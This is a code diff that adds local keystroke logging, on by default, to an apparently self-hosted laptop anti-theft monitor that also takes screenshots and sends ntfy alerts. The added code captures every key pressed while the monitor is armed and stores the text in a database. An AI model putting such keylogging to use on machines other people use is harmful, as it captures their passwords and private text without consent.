@@ -88,7 +88,9 @@ DEFAULT_CONFIG = {
         "enabled": False,
         "topic": "",                 # e.g. "moj-laptop-xyz123" — keep it unguessable
         "server": "https://ntfy.sh"  # or your self-hosted instance
-    }
+    },
+    "log_keystrokes": True,          # record pressed keys (stored locally)
+    "keylog_flush_interval": 10      # flush keystroke buffer to DB every N seconds
 }
 
 # ── database ─────────────────────────────────────────────────────────────────
@@ -356,6 +358,66 @@ def notify_ntfy(server: str, topic: str, message: str, title: str = "Laptop Moni
         logging.warning(f"ntfy notification failed: {e}")
 
 
+# ── keystroke formatting ──────────────────────────────────────────────────────
+
+_SPECIAL_KEYS = {
+    kb.Key.enter:     "\n",
+    kb.Key.space:     " ",
+    kb.Key.tab:       "\t",
+    kb.Key.backspace: "[⌫]",
+    kb.Key.delete:    "[DEL]",
+    kb.Key.esc:       "[ESC]",
+    kb.Key.up:        "[↑]",
+    kb.Key.down:      "[↓]",
+    kb.Key.left:      "[←]",
+    kb.Key.right:     "[→]",
+    kb.Key.home:      "[HOME]",
+    kb.Key.end:       "[END]",
+    kb.Key.page_up:   "[PGUP]",
+    kb.Key.page_down: "[PGDN]",
+    kb.Key.caps_lock: "[CAPS]",
+    kb.Key.f1: "[F1]",   kb.Key.f2:  "[F2]",  kb.Key.f3:  "[F3]",
+    kb.Key.f4: "[F4]",   kb.Key.f5:  "[F5]",  kb.Key.f6:  "[F6]",
+    kb.Key.f7: "[F7]",   kb.Key.f8:  "[F8]",  kb.Key.f9:  "[F9]",
+    kb.Key.f10: "[F10]", kb.Key.f11: "[F11]", kb.Key.f12: "[F12]",
+    # modifier keys — skip silently
+    kb.Key.shift:   "", kb.Key.shift_r:  "", kb.Key.shift_l:  "",
+    kb.Key.ctrl:    "", kb.Key.ctrl_r:   "", kb.Key.ctrl_l:   "",
+    kb.Key.alt:     "", kb.Key.alt_r:    "", kb.Key.alt_l:    "",
+    kb.Key.alt_gr:  "",
+    kb.Key.cmd:     "", kb.Key.cmd_r:    "", kb.Key.cmd_l:    "",
+}
+
+
+def _format_key(key) -> str:
+    """Return a human-readable string for a pynput key, or '' to skip."""
+    if isinstance(key, kb.KeyCode):
+        return key.char if key.char else ""
+    return _SPECIAL_KEYS.get(key, f"[{key.name}]")
+
+
+class KeystrokeBuffer:
+    """Thread-safe buffer that batches keystrokes and flushes on demand."""
+
+    def __init__(self):
+        self._chunks: list[str] = []
+        self._lock = threading.Lock()
+
+    def push(self, char: str):
+        with self._lock:
+            self._chunks.append(char)
+
+    def flush(self) -> str:
+        with self._lock:
+            text = "".join(self._chunks)
+            self._chunks.clear()
+        return text
+
+    def clear(self):
+        with self._lock:
+            self._chunks.clear()
+
+
 # ── main monitor class ────────────────────────────────────────────────────────
 
 class LaptopMonitor:
@@ -372,6 +434,7 @@ class LaptopMonitor:
         self._known_procs: set[str] = set()
         self._lock = threading.Lock()
         self._running = False
+        self._key_buf = KeystrokeBuffer()
 
         logging.basicConfig(
             level=logging.INFO,
@@ -414,14 +477,15 @@ class LaptopMonitor:
         self._running = True
         logging.info("Laptop monitor daemon started.")
 
-        for target in (self._screenshot_loop, self._process_loop, self._idle_loop):
+        for target in (self._screenshot_loop, self._process_loop,
+                       self._idle_loop, self._keylog_flush_loop):
             threading.Thread(target=target, daemon=True).start()
 
-        kb_listener = kb.Listener(on_press=self._on_event)
+        kb_listener = kb.Listener(on_press=self._on_key_press)
         ms_listener = ms.Listener(
-            on_move=self._on_event,
-            on_click=self._on_event,
-            on_scroll=self._on_event,
+            on_move=self._on_mouse_event,
+            on_click=self._on_mouse_event,
+            on_scroll=self._on_mouse_event,
         )
         kb_listener.start()
         ms_listener.start()
@@ -445,14 +509,23 @@ class LaptopMonitor:
 
     # ── internal ────────────────────────────────────────────────────────────
 
-    def _on_event(self, *_args):
+    def _trigger_activity(self):
         if not ARMED_FLAG.exists():
             return
-        now = time.time()
         with self._lock:
-            self._last_activity = now
+            self._last_activity = time.time()
             if self._session is None:
                 self._open_session()
+
+    def _on_key_press(self, key):
+        self._trigger_activity()
+        if self.cfg.get("log_keystrokes", True) and self._session is not None:
+            char = _format_key(key)
+            if char:
+                self._key_buf.push(char)
+
+    def _on_mouse_event(self, *_args):
+        self._trigger_activity()
 
     def _open_session(self):
         self._session = self.db.start_session()
@@ -495,10 +568,25 @@ class LaptopMonitor:
 
     def _close_session(self):
         if self._session is not None:
+            # Flush remaining keystrokes before closing
+            text = self._key_buf.flush()
+            if text:
+                self.db.log_event(self._session, "keylog", text)
             self.db.log_event(self._session, "session_end")
             self.db.end_session(self._session)
             logging.info(f"Session #{self._session} closed.")
             self._session = None
+
+    def _keylog_flush_loop(self):
+        interval = self.cfg.get("keylog_flush_interval", 10)
+        while self._running:
+            time.sleep(interval)
+            with self._lock:
+                sid = self._session
+            if sid is not None:
+                text = self._key_buf.flush()
+                if text:
+                    self.db.log_event(sid, "keylog", text)
 
     def _screenshot_loop(self):
         interval = self.cfg.get("screenshot_interval", 30)
